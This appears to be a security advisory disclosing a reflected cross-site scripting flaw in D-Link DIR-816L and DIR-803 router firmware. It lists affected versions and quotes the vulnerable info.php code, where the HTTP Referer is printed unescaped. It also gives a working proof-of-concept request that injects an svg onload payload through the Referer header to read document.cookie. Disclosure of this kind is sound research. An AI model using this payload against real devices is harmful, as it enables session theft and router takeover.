# XSS discovered in the D-link Firmware DIR-816L&DIR-803 #



## Vulnerable Firmware Versions ##
**DIR-816L REVB1 2.06 & 2.06.B09_BETA(Lastest) 
DIR-803  REVA  1.04.B02 (Lastest)**

*DIR-815 REVB 2.07.B01 & DIR-860L REVA 1.10B04 & DIR-645 REVA 1.06B01 & DIR-865L REVA 1.08B01 may also be affected.*

## Vulnerability Details ##
A Reflected Cross-site scripting vulnerability exists in DIR-816L and DIR-803, due to an unescaped `HTTP_REFERER` value being printed on the webpage.

## SYNOPSIS ##
In file **webinc/js/info.php**,there exists no output filtration being applied to the `HTTP_REFERER` parameter, before it's printed on the webpage.

## Analysis ##

	From info.php:

    $referer = $_SERVER["HTTP_REFERER"];
    		if($referer == "")
    			$referer = "./index.php";
    		
    		if($_GET["REASON"]=="ERR_REQ_TOO_LONG")
    		{
    			
    			$message = "'".i18n("The action requested failed because the file uploaded too large.")."', ".
    						"'<a href=\"".$referer."\">".i18n("Click here to return to the previous page.")."</a>'";
    		}
    		
    		echo "\t\tvar msgArray = [".$message."];\n";
    		echo "\t\tBODY.ShowMessage(\"".$title."\", msgArray);\n";
    ?>  },

So

	POC：
    GET /info.php?REASON=ERR_REQ_TOO_LONG&RESULT=1 HTTP/1.1
    Host: 192.168.0.1
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: keep-alive
    Cookie: uid=94UDHPkJzD
    Upgrade-Insecure-Requests: 1
    Referer: "><svg/onload=alert(document.cookie)>

![dir816l_xss.png](https://i.loli.net/2020/08/29/HpNArtTjm4hq6Zo.png)

![dir803_xss.png](https://i.loli.net/2020/08/29/PajBvAbKDIkJ4cQ.png)


